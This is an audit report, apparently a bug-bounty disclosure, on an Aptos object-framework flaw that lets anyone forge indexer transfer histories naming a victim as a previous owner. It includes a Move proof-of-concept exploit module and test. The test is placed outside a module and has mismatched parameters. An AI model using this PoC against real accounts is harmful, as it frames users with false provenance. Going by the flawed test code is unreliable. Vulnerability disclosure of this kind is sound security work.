# Audit Report

## Title
Address Spoofing in Object Transfers Enables Fraudulent Indexer Transfer Histories

## Summary
The `object::create_object()` function accepts an arbitrary `owner_address` parameter, allowing attackers to create objects with any address as the initial owner without that address owner's consent. When subsequently transferred, the emitted `TransferEvent` contains the spoofed address in the `from` field, causing the indexer to record fraudulent transfer histories showing victims as previous owners of objects they never owned or approved.

## Finding Description

The vulnerability exists in the Aptos object framework and its interaction with the indexer. The root cause is that `object::create_object()` is a public function accepting an unconstrained `owner_address` parameter. [1](#0-0) 

When an object is created, the `ObjectCore` resource is initialized with the provided `owner_address`: [2](#0-1) 

The attacker can then generate a `TransferRef` and `LinearTransferRef` from the returned `ConstructorRef` and transfer the object. During transfer, a `TransferEvent` is emitted with the `from` field populated from `object.owner`: [3](#0-2) 

The indexer processes this event and uses `get_from_address()` to determine the previous owner: [4](#0-3) 

The indexer then creates ownership records showing the spoofed address as the previous owner: [5](#0-4) 

**Attack Path:**
1. Attacker calls `object::create_object(@victim_address)` to create an object with victim as owner
2. Attacker generates `TransferRef` from the `ConstructorRef`
3. Attacker generates `LinearTransferRef` which captures the current owner (victim)
4. Attacker calls `transfer_with_ref(linear_ref, @attacker_address)` 
5. `TransferEvent` is emitted with `from: @victim_address, to: @attacker_address`
6. Indexer creates a "soft delete" ownership record with `owner_address: victim, amount: 0`
7. Database now shows fraudulent transfer history with victim as previous owner

The victim never consented to ownership, never signed any transaction, and never approved any transfer, yet the indexer records them as having owned and transferred the object.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty criteria as a "Significant protocol violation." The indexer is a critical infrastructure component that applications, explorers, and users rely upon to understand blockchain history and NFT provenance.

**Specific Impacts:**
- **Fraudulent NFT Provenance:** Attackers can create fake ownership trails for NFTs, making it appear that specific users owned and transferred valuable tokens
- **Reputation Damage:** Users can be framed as participants in wash trading, suspicious transfers, or other manipulative activities
- **False Attribution:** Transfer histories can be manipulated to implicate users in transactions they never approved
- **Data Integrity Violation:** The indexer's core purpose—accurately reflecting on-chain activity—is compromised

While this does not directly impact on-chain consensus or funds, it severely undermines the trustworthiness of the indexer data that the ecosystem depends on.

## Likelihood Explanation

**Likelihood: High**

The attack is trivial to execute:
- Requires only a single transaction calling public framework functions
- No special privileges or validator access required
- No sophisticated cryptographic or timing attacks needed
- Can be repeated arbitrarily to create multiple fraudulent records

The only barrier is that most legitimate applications use wrapper functions like `token::create()` which derive the owner from the signer. However, nothing prevents direct calls to `object::create_object()` with arbitrary addresses, and malicious smart contracts can easily exploit this.

## Recommendation

**Immediate Fix:** Restrict `object::create_object()` to only accept the transaction sender's address as the owner, or require explicit consent from the designated owner address.

**Option 1 - Restrict to Signer:**
```move
public fun create_object(creator: &signer): ConstructorRef {
    let owner_address = signer::address_of(creator);
    let unique_address = transaction_context::generate_auid_address();
    create_object_internal(owner_address, unique_address, true)
}
```

**Option 2 - Require Multi-Sig Consent:**
Add validation that the designated owner has explicitly consented to ownership assignment through a capability or signature verification.

**Long-term Solution:** 
Implement an object ownership acceptance mechanism where:
1. Objects start in a "pending" state when created with a different owner
2. The designated owner must explicitly accept ownership
3. Only after acceptance do transfers emit events and update indexer records
4. Indexer should distinguish between "created-for" and "accepted-by" in ownership records

## Proof of Concept

```move
module attacker::exploit {
    use aptos_framework::object;
    use std::signer;
    
    /// Demonstrates creating fraudulent transfer history for victim
    public entry fun create_fraudulent_transfer(
        attacker: &signer,
        victim_address: address
    ) {
        // Step 1: Create object with victim as owner (victim never consented!)
        let constructor_ref = object::create_object(victim_address);
        
        // Step 2: Generate TransferRef from ConstructorRef
        let transfer_ref = object::generate_transfer_ref(&constructor_ref);
        
        // Step 3: Generate LinearTransferRef (captures victim as current owner)
        let linear_transfer_ref = object::generate_linear_transfer_ref(&transfer_ref);
        
        // Step 4: Transfer to attacker
        // This emits TransferEvent with from=victim_address, to=attacker_address
        let attacker_address = signer::address_of(attacker);
        object::transfer_with_ref(linear_transfer_ref, attacker_address);
        
        // Result: Indexer now records that victim owned and transferred this object
        // even though victim never signed anything or even knew about it!
    }
}

#[test(attacker = @0x123, victim = @0x456)]
fun test_fraudulent_transfer(attacker: &signer) {
    use aptos_framework::object;
    
    // Attacker creates object claiming victim owns it
    let constructor_ref = object::create_object(@0x456);
    let obj = object::object_from_constructor_ref<object::ObjectCore>(&constructor_ref);
    
    // Verify victim is recorded as owner (but never consented!)
    assert!(object::owner(obj) == @0x456, 0);
    
    // Transfer to attacker
    let transfer_ref = object::generate_transfer_ref(&constructor_ref);
    let linear_ref = object::generate_linear_transfer_ref(&transfer_ref);
    object::transfer_with_ref(linear_ref, @0x123);
    
    // Now attacker owns it, and indexer shows victim as previous owner
    assert!(object::owner(obj) == @0x123, 1);
    
    // TransferEvent was emitted with from=@0x456, creating fraudulent history
}
```

**Notes:**
- The vulnerability stems from a fundamental design choice allowing unconsented ownership assignment in the object framework
- The indexer correctly processes on-chain events, but those events themselves can be manipulated to contain false information about user actions
- This affects all object-based tokens (Token v2, NFTs) that rely on the indexer for transfer history
- The attack requires no special access and can be executed by any user deploying a malicious Move module

### Citations

**File:** aptos-move/framework/aptos-framework/sources/object.move (L268-271)
```text
    public fun create_object(owner_address: address): ConstructorRef {
        let unique_address = transaction_context::generate_auid_address();
        create_object_internal(owner_address, unique_address, true)
    }
```

**File:** aptos-move/framework/aptos-framework/sources/object.move (L318-339)
```text
    fun create_object_internal(
        creator_address: address,
        object: address,
        can_delete: bool,
    ): ConstructorRef {
        assert!(!exists<ObjectCore>(object), error::already_exists(EOBJECT_EXISTS));

        let object_signer = create_signer(object);
        let guid_creation_num = INIT_GUID_CREATION_NUM;
        let transfer_events_guid = guid::create(object, &mut guid_creation_num);

        move_to(
            &object_signer,
            ObjectCore {
                guid_creation_num,
                owner: creator_address,
                allow_ungated_transfer: true,
                transfer_events: event::new_event_handle(transfer_events_guid),
            },
        );
        ConstructorRef { self: object, can_delete }
    }
```

**File:** aptos-move/framework/aptos-framework/sources/object.move (L477-509)
```text
    public fun transfer_with_ref(self: LinearTransferRef, to: address) acquires ObjectCore, TombStone {
        assert!(!exists<Untransferable>(self.self), error::permission_denied(EOBJECT_NOT_TRANSFERRABLE));

        // Undo soft burn if present as we don't want the original owner to be able to reclaim by calling unburn later.
        if (exists<TombStone>(self.self)) {
            let TombStone { original_owner: _ } = move_from<TombStone>(self.self);
        };

        let object = borrow_global_mut<ObjectCore>(self.self);
        assert!(
            object.owner == self.owner,
            error::permission_denied(ENOT_OBJECT_OWNER),
        );
        if (std::features::module_event_migration_enabled()) {
            event::emit(
                Transfer {
                    object: self.self,
                    from: object.owner,
                    to,
                },
            );
        } else {
            event::emit_event(
                &mut object.transfer_events,
                TransferEvent {
                    object: self.self,
                    from: object.owner,
                    to,
                },
            );
        };
        object.owner = to;
    }
```

**File:** crates/indexer/src/models/token_models/v2_token_utils.rs (L390-392)
```rust
    pub fn get_from_address(&self) -> String {
        standardize_address(&self.from)
    }
```

**File:** crates/indexer/src/models/token_models/v2_token_ownerships.rs (L166-210)
```rust
        if let Some((event_index, transfer_event)) = &metadata.transfer_event {
            // If it's a self transfer then skip
            if transfer_event.get_to_address() == transfer_event.get_from_address() {
                return Ok(Some((ownership, current_ownership, None, None)));
            }
            Ok(Some((
                ownership,
                current_ownership,
                Some(Self {
                    transaction_version: token_data.transaction_version,
                    // set to negative of event index to avoid collison with write set index
                    write_set_change_index: -1 * event_index,
                    token_data_id: token_data_id.clone(),
                    property_version_v1: BigDecimal::zero(),
                    // previous owner
                    owner_address: Some(transfer_event.get_from_address()),
                    storage_id: storage_id.clone(),
                    // soft delete
                    amount: BigDecimal::zero(),
                    table_type_v1: None,
                    token_properties_mutated_v1: None,
                    is_soulbound_v2: Some(is_soulbound),
                    token_standard: TokenStandard::V2.to_string(),
                    is_fungible_v2: token_data.is_fungible_v2,
                    transaction_timestamp: token_data.transaction_timestamp,
                    non_transferrable_by_owner: Some(is_soulbound),
                }),
                Some(CurrentTokenOwnershipV2 {
                    token_data_id,
                    property_version_v1: BigDecimal::zero(),
                    // previous owner
                    owner_address: transfer_event.get_from_address(),
                    storage_id,
                    // soft delete
                    amount: BigDecimal::zero(),
                    table_type_v1: None,
                    token_properties_mutated_v1: None,
                    is_soulbound_v2: Some(is_soulbound),
                    token_standard: TokenStandard::V2.to_string(),
                    is_fungible_v2: token_data.is_fungible_v2,
                    last_transaction_version: token_data.transaction_version,
                    last_transaction_timestamp: token_data.transaction_timestamp,
                    non_transferrable_by_owner: Some(is_soulbound),
                }),
            )))
```
